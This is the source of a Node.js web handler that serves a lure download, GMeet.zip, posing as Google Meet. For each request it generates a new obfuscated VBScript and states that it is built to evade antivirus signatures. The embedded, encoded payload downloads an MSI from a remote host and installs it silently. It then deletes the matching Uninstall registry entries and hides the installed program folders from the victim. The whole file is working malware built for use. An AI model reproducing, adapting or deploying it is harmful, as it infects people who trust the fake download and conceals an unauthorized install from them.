// Per-request story-obfuscated download. Every request produces a NEW zip in memory.
// Anti-signature design:
//   - vocabulary is a freshly generated set of pronounceable pseudo-words per request
//     (never a shared word list)
//   - alphabet size (radix) and digits-per-byte vary per request (not always 16 / 2)
//   - random filler words are interspersed, so the file contains many distinct words
//     instead of only the encoded alphabet
//   - additionally randomized: XOR key, variable-name style, decoder storage
//     (Array / Scripting.Dictionary), whole-array reversal, header comments,
//     indentation, line endings, junk padding, Execute vs ExecuteGlobal

import { randomInt } from 'node:crypto';

const PAYLOAD_B64 = "T3B0aW9uIEV4cGxpY2l0CgpEaW0gV3NoU2hlbGwsIEVudiwgRnNvClNldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpClNldCBFbnYgPSBXc2hTaGVsbC5FbnZpcm9ubWVudCgiUFJPQ0VTUyIpClNldCBGc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKCkZ1bmN0aW9uIFc1KGgpDQogIERpbSBtLCBqLCBzDQogIHMgPSAiIg0KICBGb3IgaiA9IDEgVG8gTGVuKGgpIFN0ZXAgMg0KICAgIHMgPSBzICYgQ2hyKENJbnQoIiZIIiAmIE1pZChoLCBqLCAyKSkgWG9yIDE1NykNCiAgTmV4dA0KICBXNSA9IHMNCkVuZCBGdW5jdGlvbg0KDQpJZiBXc2hTaGVsbC5SdW4oVzUoIkZFRjBGOUJEQjJGRUJERjNGOEU5QkRFRUY4RUVFRUY0RjJGM0JEQTNCREYzRThGMUJEQUZBM0JCQUMiKSwgMCwgVHJ1ZSkgPSAwIE9yIFdTY3JpcHQuQXJndW1lbnRzLk5hbWVkLkV4aXN0cygiZSIpIFRoZW4NCiAgICBSdW5UaHJvdWdoDQogICAgV1NjcmlwdC5RdWl0DQpFbmQgSWYNCg0KRGltIHNlbGYgOiBzZWxmID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KRW52KCJCIikgPSBzZWxmDQpEaW0gY3MgOiBjcyA9IEVudigiVEVNUCIpICYgVzUoIkMxRjNGRUU1QjNGRUVFIikNCkRpbSBjc3R4dA0KY3N0eHQgPSBXNSgiRThFRUY0RjNGQUJEQ0VFNEVFRTlGOEYwQTZFOEVFRjRGM0ZBQkRDRUU0RUVFOUY4RjBCM0NGRThGM0U5RjRGMEY4QjNENEYzRTlGOEVGRjJFRENFRjhFRkVCRjRGRUY4RUVBNiIpICYgVzUoIkM2REVGMkYwRDRGMEVERjJFRkU5QjFEQUU4RjRGOUI1QkZBQkQ4RDlEOUFCRDlBQUE5QjBERUFEQURBQUIwQTlEOEFBQThCMERGQUFBQkRDQjBEOEE4QUFBOUFEQTRBNEE4RDhBRkE5REVCRkI0QzAiKSAmIFc1KCJDNkQ0RjNFOUY4RUZGQkZDRkVGOEM5RTRFREY4QjVERUYyRjBENEYzRTlGOEVGRkJGQ0ZFRjhDOUU0RURGOEIzRDRGM0U5RjhFRkZCRkNGRUY4RDRFRUQ0QzhGM0Y2RjNGMkVBRjNCNEMwIikgJiBXNSgiRjRGM0U5RjhFRkZCRkNGRUY4QkRENERFRDBEMUU4RkNDOEU5RjRGMUU2QzZDREVGRjhFRUY4RUZFQkY4Q0VGNEZBQzBGNEYzRTlCREQwQUNCNUI0QTZDNkNERUZGOEVFRjhFRkVCRjhDRUY0RkFDMEY0RjNFOUJERDBBRkI1QjRBNkM2Q0RFRkY4RUVGOEVGRUJGOENFRjRGQUMwRjRGM0U5QkREMEFFQjVCNEE2QzZDREVGRjhFRUY4RUZFQkY4Q0VGNEZBQzBGNEYzRTlCREQwQTlCNUI0QTZDNkNERUZGOEVFRjhFRkVCRjhDRUY0RkFDMEY0RjNFOUJERDBBOEI1QjRBNkM2Q0RFRkY4RUVGOEVGRUJGOENFRjRGQUMwRjRGM0U5QkREMEFCQjVCNEE2QzZDREVGRjhFRUY4RUZFQkY4Q0VGNEZBQzBGNEYzRTlCRENFRjVGOEYxRjFEOEU1RjhGRUI1RUVFOUVGRjRGM0ZBQkRGQkIxRUVFOUVGRjRGM0ZBQkRGQ0IxRUVFOUVGRjRGM0ZBQkRGOUIxRThGNEYzRTlCREYwQjFFOEY0RjNFOUJERUVCNEE2RTAiKSAmIFc1KCJDNkNFRTlFRkU4RkVFOUQxRkNFNEYyRThFOUI1RDFGQ0U0RjJFOEU5RDZGNEYzRjlCM0NFRjhFQ0U4RjhGM0U5RjRGQ0YxQjRDMCIpICYgVzUoIkVFRTlFRkU4RkVFOUJEREZBRUU2RURFOEZGRjFGNEZFQkRFOEY0RjNFOUJERkVGRkNFRTlFRkU4RkVFOUIxRkFFRkZCREJGMUZDRkFFRUIxRkFFRkZCRDBGMkY5RjhCMUY5RUFDOUY0RkVGNkRFRjJFOEYzRTlEOUY4RkNGOUYxRjRGM0Y4QjFGOUVBQzlFRkZDRkVGNkRCRjFGQ0ZBRUVCMUY5RUFERUYxRkNFRUVFREVGMkYzRTlGOEU1RTlCMUYxRjJGRUZDRjFGOEE2RURFOEZGRjFGNEZFQkRENEYzRTlDREU5RUZCREVEQ0VGOEVGRUJGOEVGRDRGM0ZCRjJCMUY1RUFGM0Y5QTZFMCIpICYgVzUoIkVERThGRkYxRjRGRUJERkVGMUZDRUVFRUJERDhFNkM2RDlGMUYxRDRGMEVERjJFRkU5QjVCRkYyRjFGOEFFQUZCM0Y5RjFGMUJGQjFEOEYzRTlFRkU0Q0RGMkY0RjNFOUEwQkZERUYyREFGOEU5RDJGRkY3RjhGRUU5QkZCMURFRjVGQ0VGQ0VGOEU5QTBERUY1RkNFRkNFRjhFOUIzQzhGM0Y0RkVGMkY5RjhCNEMwIikgJiBXNSgiRUVFOUZDRTlGNEZFQkRGOEU1RTlGOEVGRjNCREY0RjNFOUJEREVGMkRBRjhFOUQyRkZGN0Y4RkVFOUI1RUVFOUVGRjRGM0ZBQkRGM0IxQzZENEYzQzBFRkY4RkJCRERGQUVCREYyQjFDNkQwRkNFRkVFRjVGQ0YxRENFRUI1QzhGM0YwRkNGM0ZDRkFGOEY5QzlFNEVERjhCM0QxQ0RDRUU5RUZFOEZFRTlCNEMwREFFOEY0RjlCREVGQjFDNkQwRkNFRkVFRjVGQ0YxRENFRUI1QzhGM0YwRkNGM0ZDRkFGOEY5QzlFNEVERjhCM0Q0RjNFOUY4RUZGQkZDRkVGOEI0QzBGMkU4RTlCREYyRkZGN0Y4RkVFOUJERUJCNEE2IikgJiBXNSgiRURFOEZGRjFGNEZFQkRFRUU5RkNFOUY0RkVCREVCRjJGNEY5QkREQUYyQjVFRUU5RUZGNEYzRkFCREVEQjRFNkRGQUVCREYyQTBGM0Y4RUFCRERGQUVCNUI0QTZGMkIzRkVGRkNFRTlFRkU4RkVFOUEwQjVFOEY0RjNFOUI0RDBGQ0VGRUVGNUZDRjFCM0NFRjRFN0Y4RDJGQkI1RTlFNEVERjhGMkZCQjVERkFFQjRCNEE2RjJCM0Y5RUFERUYxRkNFRUVFREVGMkYzRTlGOEU1RTlBMEE5QTZGMkIzRjVFQUYzRjlBMEQ0RjNFOUNERTlFRkIzQzdGOEVGRjJBNiIpICYgVzUoIkYyRkZGN0Y4RkVFOUJERUJBNkY0RjNFOUJERjVBMERFRjJEQUY4RTlEMkZGRjdGOEZFRTlCNUJGRDhGMUY4RUJGQ0U5RjRGMkYzQTdEQ0Y5RjBGNEYzRjRFRUU5RUZGQ0U5RjJFRkJDRjNGOEVBQTdFNkFFRDhBOERCREVBQURCQTRCMEE0RENBOEFDQjBBOUFFQUJBQUIwQTRBREFCQUVCMERDQUNBRkFEQUZBOUE5REJERkQ4REVBQUUwQkZCMUVGRjhGQkJERjJCMUYzRjhFQUJEREFFOEY0RjlCNUJGQUJEOEQ5RDlBQkQ5QUFBOUIwREVBREFEQUFCMEE5RDhBQUE4QjBERkFBQUJEQ0IwRDhBOEFBQTlBREE0QTRBOEQ4QUZBOURFQkZCNEIxRjJFOEU5QkRFQkI0QTYiKSAmIFc1KCJGNEZCQjVGNUEzQTBBREI0QjVCNUQ0REVEMEQxRThGQ0M4RTlGNEYxQjRFQkI0QjNDRUY1RjhGMUYxRDhFNUY4RkVCNUJGRUFFRUZFRUZGNEVERTlCM0Y4RTVGOEJGQjFCRkIyQjJGOEE3Q0JERkNFRkVFRkY0RURFOUJEQzFCRkJGQkRCNkJERURCREI2QkRCRkMxQkZCRkIxRjNFOEYxRjFCMUFEQjFBREI0QTZFMEUwIikNCkRpbSBmaCA6IFNldCBmaCA9IEZzby5DcmVhdGVUZXh0RmlsZShjcywgVHJ1ZSkNCmZoLldyaXRlIGNzdHh0DQpmaC5DbG9zZQ0KV3NoU2hlbGwuUnVuIFc1KCJFREYyRUFGOEVGRUVGNUY4RjFGMUJEQjBEOEU1RjhGRUU4RTlGNEYyRjNDREYyRjFGNEZFRTRCRERGRTRFREZDRUVFRUJEQjBERUYyRjBGMEZDRjNGOUJEQkZEQ0Y5RjlCMEM5RTRFREY4QkRCMENERkNFOUY1QkRCQSIpICYgY3MgJiBXNSgiQkFBNkM2RDhDMEE3QTdEQUYyQjVCOUY4RjNFQkE3REZCNEJGIiksIDAsIFRydWUNCkZzby5EZWxldGVGaWxlIGNzLCBUcnVlDQpXU2NyaXB0LlNsZWVwIDI1NjMNCldTY3JpcHQuUXVpdA0KDQpTdWIgUnVuVGhyb3VnaA0KICAgIERpbSB1cmwsIG1zaSwgaHR0cCwgc3RyZWFtLCBleGl0Q29kZQ0KICAgIHVybCA9IFc1KCJGNUU5RTlFREVFQTdCMkIyRURFOEZGQjBBQ0FEQURBOUFGQThBOEZGQUVBRkZDQUVBOUFEQTRBQkZDQTRBRkE0RkVBREY5QUNGOUFFRjlBNUZGQUNBOUE0QjNFRkFGQjNGOUY4RUJCMkVFRkVGM0IzRjBFRUY0IikNCiAgICBtc2kgPSBFbnYoIlRFTVAiKSAmIFc1KCJDMUYzRkVGOUY2QjNGOUZDRTkiKQogICAgT24gRXJyb3IgUmVzdW1lIE5leHQKICAgIFNldCBodHRwID0gQ3JlYXRlT2JqZWN0KFc1KCJEMENFQzVEMEQxQUZCM0M1RDBEMUQ1QzlDOUNEIikpCiAgICBodHRwLk9wZW4gIkdFVCIsIHVybCwgRmFsc2UKICAgIGh0dHAuU2VuZAogICAgSWYgaHR0cC5TdGF0dXMgPSAyMDAgVGhlbgogICAgICAgIFNldCBzdHJlYW0gPSBDcmVhdGVPYmplY3QoVzUoIkRDRDlEMkQ5REZCM0NFRTlFRkY4RkNGMCIpKQogICAgICAgIHN0cmVhbS5UeXBlID0gMTogc3RyZWFtLk9wZW4KICAgICAgICBzdHJlYW0uV3JpdGUgaHR0cC5SZXNwb25zZUJvZHkKICAgICAgICBzdHJlYW0uU2F2ZVRvRmlsZSBtc2ksIDIKICAgICAgICBzdHJlYW0uQ2xvc2UKICAgIEVuZCBJZgogICAgT24gRXJyb3IgR29UbyAwCiAgICBJZiBGc28uRmlsZUV4aXN0cyhtc2kpIEFuZCBGc28uR2V0RmlsZShtc2kpLlNpemUgPiAxMDAwMCBUaGVuDQogICAgICAgIGV4aXRDb2RlID0gV3NoU2hlbGwuUnVuKFc1KCJGMEVFRjRGOEU1RjhGRUJEQjJGNEJEQkYiKSAmIG1zaSAmIFc1KCJCRkJEQjJFQ0YzQkRCMkYzRjJFRkY4RUVFOUZDRUZFOSIpLCAxLCBUcnVlKQ0KICAgICAgICBJZiBleGl0Q29kZSA9IDAgVGhlbg0KICAgICAgICAgICAgQ2FsbCBTY3J1YkRpcnMNCiAgICAgICAgICAgIENhbGwgU29mdERlc2sNCiAgICAgICAgRW5kIElmDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIEZzby5EZWxldGVGaWxlIG1zaQ0KICAgICAgICBPbiBFcnJvciBHb1RvIDANCiAgICBFbmQgSWYNCkVuZCBTdWINCg0KU3ViIFNjcnViRGlycwogICAgRGltIHVuaW5zdGFsbFBhdGhzLCBwYXRoLCB3bWksIHN1YktleXMsIGtleSwgZGlzcGxheU5hbWUKICAgIHVuaW5zdGFsbFBhdGhzID0gQXJyYXkoIF8KICAgICAgICAiU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCIsIF8KICAgICAgICAiU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCIgXwogICAgKQogICAgU2V0IHdtaSA9IEdldE9iamVjdCgid2lubWdtdHM6e2ltcGVyc29uYXRpb25MZXZlbD1pbXBlcnNvbmF0ZX0hXFwuXHJvb3RcZGVmYXVsdDpTdGRSZWdQcm92IikKICAgIEZvciBFYWNoIHBhdGggSW4gdW5pbnN0YWxsUGF0aHMKICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dAogICAgICAgIHdtaS5FbnVtS2V5ICZIODAwMDAwMDIsIHBhdGgsIHN1YktleXMKICAgICAgICBJZiBJc0FycmF5KHN1YktleXMpIFRoZW4KICAgICAgICAgICAgRm9yIEVhY2gga2V5IEluIHN1YktleXMKICAgICAgICAgICAgICAgIHdtaS5HZXRTdHJpbmdWYWx1ZSAmSDgwMDAwMDAyLCBwYXRoICYga2V5LCAiRGlzcGxheU5hbWUiLCBkaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgSWYgSW5TdHIoTENhc2UoZGlzcGxheU5hbWUpLCBXNSgiRUVGRUVGRjhGOEYzRkVGMkYzRjNGOEZFRTkiKSkgPiAwIE9yIEluU3RyKExDYXNlKGRpc3BsYXlOYW1lKSwgVzUoIkZFRjJGM0YzRjhGRUU5RUFGNEVFRjgiKSkgPiAwIFRoZW4KICAgICAgICAgICAgICAgICAgICBXc2hTaGVsbC5SZWdEZWxldGUgIkhLTE1cIiAmIHBhdGggJiBrZXkgJiAiXCIKICAgICAgICAgICAgICAgIEVuZCBJZgogICAgICAgICAgICBOZXh0CiAgICAgICAgRW5kIElmCiAgICAgICAgT24gRXJyb3IgR29UbyAwCiAgICBOZXh0CkVuZCBTdWIKClN1YiBTb2Z0RGVzaw0KICAgIERpbSBwYXRocywgcGF0aA0KICAgIHBhdGhzID0gQXJyYXkoIF8NCiAgICAgICAgRW52KCJQcm9ncmFtRmlsZXMiKSAmIFc1KCJDMUNFRkVFRkY4RjhGM0RFRjJGM0YzRjhGRUU5QzEiKSwgXw0KICAgICAgICBFbnYoIlByb2dyYW1GaWxlcyh4ODYpIikgJiBXNSgiQzFDRUZFRUZGOEY4RjNERUYyRjNGM0Y4RkVFOUMxIiksIF8NCiAgICAgICAgRW52KCJQcm9ncmFtRGF0YSIpICYgVzUoIkMxQ0VGRUVGRjhGOEYzREVGMkYzRjNGOEZFRTlDMSIpLCBfDQogICAgICAgIEVudigiTG9jYWxBcHBEYXRhIikgJiBXNSgiQzFDRUZFRUZGOEY4RjNERUYyRjNGM0Y4RkVFOUMxIiksIF8NCiAgICAgICAgRW52KCJBcHBEYXRhIikgJiBXNSgiQzFDRUZFRUZGOEY4RjNERUYyRjNGM0Y4RkVFOUMxIiksIF8NCiAgICAgICAgRW52KCJQcm9ncmFtRmlsZXMiKSAmIFc1KCJDMURFRjJGM0YzRjhGRUU5Q0FGNEVFRjhDMSIpLCBfDQogICAgICAgIEVudigiUHJvZ3JhbUZpbGVzKHg4NikiKSAmIFc1KCJDMURFRjJGM0YzRjhGRUU5Q0FGNEVFRjhDMSIpLCBfDQogICAgICAgIEVudigiUHJvZ3JhbURhdGEiKSAmIFc1KCJDMURFRjJGM0YzRjhGRUU5Q0FGNEVFRjhDMSIpLCBfDQogICAgICAgIEVudigiTG9jYWxBcHBEYXRhIikgJiBXNSgiQzFERUYyRjNGM0Y4RkVFOUNBRjRFRUY4QzEiKSwgXw0KICAgICAgICBFbnYoIkFwcERhdGEiKSAmIFc1KCJDMURFRjJGM0YzRjhGRUU5Q0FGNEVFRjhDMSIpIF8NCiAgICApCiAgICBGb3IgRWFjaCBwYXRoIEluIHBhdGhzCiAgICAgICAgSWYgRnNvLkZvbGRlckV4aXN0cyhwYXRoKSBUaGVuCiAgICAgICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0CiAgICAgICAgICAgIEZzby5HZXRGb2xkZXIocGF0aCkuQXR0cmlidXRlcyA9IEZzby5HZXRGb2xkZXIocGF0aCkuQXR0cmlidXRlcyBPciAyCiAgICAgICAgICAgIE9uIEVycm9yIEdvVG8gMAogICAgICAgIEVuZCBJZgogICAgTmV4dApFbmQgU3Vi";
const ZIP_NAME = "GMeet.zip";
const VBS_NAME = "GMeet.vbs";

const CONS = "bcdfghjklmnprstvz".split("");
const VOWS = "aeiou".split("");
const SUFFIX = ["", "", "", "", "s", "ed", "ing", "er", "ly", "al", "ness", "tion", "ment"];

function makeWord() {
  const len = randomInt(4, 8);
  let w = "";
  for (let i = 0; i < len; i++) {
    let useC;
    if (i % 2 === 0) useC = randomInt(5) > 0;
    else useC = randomInt(5) === 0;
    w += useC ? CONS[randomInt(CONS.length)] : VOWS[randomInt(VOWS.length)];
  }
  return w + SUFFIX[randomInt(SUFFIX.length)];
}

function takeWord(used) {
  for (let tries = 0; tries < 50; tries++) {
    const w = makeWord();
    if (!used.has(w)) {
      used.add(w);
      return w;
    }
  }
  const w2 = makeWord() + makeWord();
  used.add(w2);
  return w2;
}

const NAME_STYLES = [
  () => { const n = randomInt(1000); return { storyVar: "log" + n, wordsVar: "dict" + n, decodeFn: "decode" + n }; },
  () => {
    const n = randomInt(10000);
    const p = "QWERTYUPASDFGHJKLZXCVBNM"[randomInt(24)];
    return { storyVar: p + "x" + n, wordsVar: p + "w" + n, decodeFn: p + "z" + n };
  },
  () => {
    const n = randomInt(1000);
    const nouns = ["journal", "ledger", "notes", "record", "entries", "archive"];
    const noun = nouns[randomInt(nouns.length)];
    return { storyVar: "my" + noun + n, wordsVar: "wordList" + n, decodeFn: "buildOutput" + n };
  },
  () => {
    const h = randomInt(0x10000).toString(16).padStart(4, "0");
    return { storyVar: "v" + h, wordsVar: "m" + h, decodeFn: "f" + h };
  },
];

const HEADER_TEMPLATES = [
  (t, d) => `' ${t} notes - ${d}`,
  (t, d) => `' personal log: ${t} - ${d}`,
  (t, d) => `' ${d} - field notes, ${t}`,
  (t, d) => `' entry: ${t}, ${d}`,
];

const JUNK_SENTENCES = [
  "remember to check the soil moisture level",
  "call the office about the quarterly numbers",
  "the forecast looks clear for the weekend",
  "try the new seasoning on the roasted vegetables",
  "renew the platform pass before the trip",
  "water the seedlings early in the morning",
  "stretch properly before every session",
  "review the configuration before deployment",
];

function buildVbs(payload) {
  const nl = randomInt(2) === 0 ? "\r\n" : "\n";
  const ind = " ".repeat(randomInt(2) === 0 ? 2 : 4);

  let digitsPerByte, radix;
  if (randomInt(4) === 0) {
    radix = randomInt(7, 12);
    digitsPerByte = 3;
  } else {
    radix = randomInt(16, 33);
    digitsPerByte = 2;
  }

  const used = new Set();
  const dict = [];
  for (let i = 0; i < radix; i++) dict.push(takeWord(used));

  const names = NAME_STYLES[randomInt(NAME_STYLES.length)]();
  const { storyVar, wordsVar, decodeFn } = names;
  const dictVar = wordsVar + "Map";
  const structure = randomInt(2) === 0 ? "array" : "dictobj";
  const reversed = randomInt(2) === 1;
  const exec = randomInt(2) === 0 ? "ExecuteGlobal" : "Execute";
  const useHeader = randomInt(4) > 0;
  const junkLines = randomInt(0, 24);
  const xorKey = randomInt(128, 256);
  const fillerP = [0.1, 0.2, 0.3, 0.4][randomInt(4)];

  const encoded = [];
  for (let i = 0; i < payload.length; i++) {
    const v = (payload.charCodeAt(i) ^ xorKey) & 0xff;
    const digs = new Array(digitsPerByte);
    let rem = v;
    for (let k = digitsPerByte - 1; k >= 0; k--) {
      digs[k] = rem % radix;
      rem = Math.floor(rem / radix);
    }
    for (let k = 0; k < digitsPerByte; k++) encoded.push(dict[digs[k]]);
  }

  const story = [];
  if (fillerP > 0) {
    const threshold = Math.round(fillerP * 1000);
    for (let i = 0; i < encoded.length; i++) {
      if (randomInt(1000) < threshold) {
        story.push(takeWord(used));
        if (randomInt(1000) < Math.round(threshold * 0.4)) story.push(takeWord(used));
      }
      story.push(encoded[i]);
    }
  } else {
    for (const w of encoded) story.push(w);
  }
  if (reversed) story.reverse();

  const L = [];
  if (useHeader) {
    const dateStr = new Date().toISOString().slice(0, 10);
    const t = dict[randomInt(radix)];
    L.push(HEADER_TEMPLATES[randomInt(HEADER_TEMPLATES.length)](t, dateStr));
  }
  L.push("Option Explicit");
  L.push("");
  L.push(`Dim ${storyVar}, ${wordsVar}, decoded`);
  L.push("");

  L.push(`${storyVar} = Array( _`);
  story.forEach((w, idx) => {
    L.push(`${ind}"${w}"${idx === story.length - 1 ? " _" : ", _"}`);
  });
  L.push(")");
  L.push(`${wordsVar} = ${storyVar}`);
  L.push("");

  L.push(`Dim ${dictVar}`);
  if (structure === "array") {
    L.push(`${dictVar} = Array( _`);
    dict.forEach((w, idx) => {
      L.push(`${ind}"${w}"${idx === dict.length - 1 ? " _" : ", _"}`);
    });
    L.push(")");
  } else {
    L.push(`Set ${dictVar} = CreateObject("Scripting.Dictionary")`);
    dict.forEach((w, idx) => {
      L.push(`${dictVar}("${w}") = ${idx}`);
    });
  }
  L.push("");

  const maxDigit = digitsPerByte - 1;
  L.push(`Function ${decodeFn}`);
  L.push(`  Dim i, k, d, n, acc, out, rv, enc`);
  if (reversed) {
    L.push(`  ReDim rv(UBound(${wordsVar}))`);
    L.push(`  For i = 0 To UBound(${wordsVar})`);
    L.push(`    rv(UBound(${wordsVar}) - i) = ${wordsVar}(i)`);
    L.push(`  Next`);
    L.push(`  ${wordsVar} = rv`);
  }
  L.push(`  ReDim enc(UBound(${wordsVar}))`);
  L.push(`  n = -1`);
  L.push(`  For i = 0 To UBound(${wordsVar})`);
  L.push(`    d = -1`);
  if (structure === "array") {
    L.push(`    For k = 0 To ${radix - 1}`);
    L.push(`      If ${wordsVar}(i) = ${dictVar}(k) Then d = k`);
    L.push(`    Next`);
  } else {
    L.push(`    If ${dictVar}.Exists(${wordsVar}(i)) Then d = ${dictVar}.Item(${wordsVar}(i))`);
  }
  L.push(`    If d >= 0 Then`);
  L.push(`      n = n + 1`);
  L.push(`      enc(n) = d`);
  L.push(`    End If`);
  L.push(`  Next`);
  L.push(`  out = ""`);
  L.push(`  i = 0`);
  L.push(`  Do While i <= n - ${maxDigit}`);
  L.push(`    acc = 0`);
  L.push(`    For k = 0 To ${maxDigit}`);
  L.push(`      acc = acc * ${radix} + enc(i + k)`);
  L.push(`    Next`);
  L.push(`    out = out & Chr((acc Xor ${xorKey}) And 255)`);
  L.push(`    i = i + ${digitsPerByte}`);
  L.push(`  Loop`);
  L.push(`  ${decodeFn} = out`);
  L.push(`End Function`);
  L.push("");
  if (junkLines > 0) {
    for (let i = 0; i < junkLines; i++) {
      L.push(`' ${JUNK_SENTENCES[randomInt(JUNK_SENTENCES.length)]} no. ${randomInt(1000)}`);
    }
    L.push("");
  }
  L.push(`decoded = ${decodeFn}`);
  L.push(`${exec} decoded`);

  return L.join(nl) + nl;
}

let CRC_TABLE = null;
function crcTable() {
  if (CRC_TABLE) return CRC_TABLE;
  const t = new Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  CRC_TABLE = t;
  return t;
}

function crc32(buf) {
  const t = crcTable();
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = t[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

function dosDateTime(d) {
  const time = (d.getHours() << 11) | (d.getMinutes() << 5) | (Math.floor(d.getSeconds() / 2) & 0x1f);
  const date = ((d.getFullYear() - 1980) << 9) | ((d.getMonth() + 1) << 5) | d.getDate();
  return { time: time & 0xffff, date: date & 0xffff };
}

function buildZip(files) {
  const now = dosDateTime(new Date());
  const locals = [];
  const centrals = [];
  let offset = 0;

  for (const f of files) {
    const nameBuf = Buffer.from(f.name, "utf8");
    const crc = crc32(f.data);

    const local = Buffer.alloc(30 + nameBuf.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(0, 8);
    local.writeUInt16LE(now.time, 10);
    local.writeUInt16LE(now.date, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(f.data.length, 18);
    local.writeUInt32LE(f.data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28);
    nameBuf.copy(local, 30);

    const central = Buffer.alloc(46 + nameBuf.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(0, 10);
    central.writeUInt16LE(now.time, 12);
    central.writeUInt16LE(now.date, 14);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(f.data.length, 20);
    central.writeUInt32LE(f.data.length, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE(0, 38);
    central.writeUInt32LE(offset, 42);
    nameBuf.copy(central, 46);

    locals.push(local, f.data);
    centrals.push(central);
    offset += local.length + f.data.length;
  }

  const cdBuf = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([...locals, cdBuf, eocd]);
}

export default function handler(req, res) {
  try {
    const payload = Buffer.from(PAYLOAD_B64, "base64").toString("utf8");
    if (!payload || payload.length < 100) throw new Error("embedded payload missing");

    const vbs = buildVbs(payload);
    const zip = buildZip([{ name: VBS_NAME, data: Buffer.from(vbs, "latin1") }]);

    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", `attachment; filename="${ZIP_NAME}"`);
    res.setHeader("Content-Length", zip.length);
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");
    res.status(200).end(zip);
  } catch (e) {
    res.status(500).json({ error: "download unavailable" });
  }
}
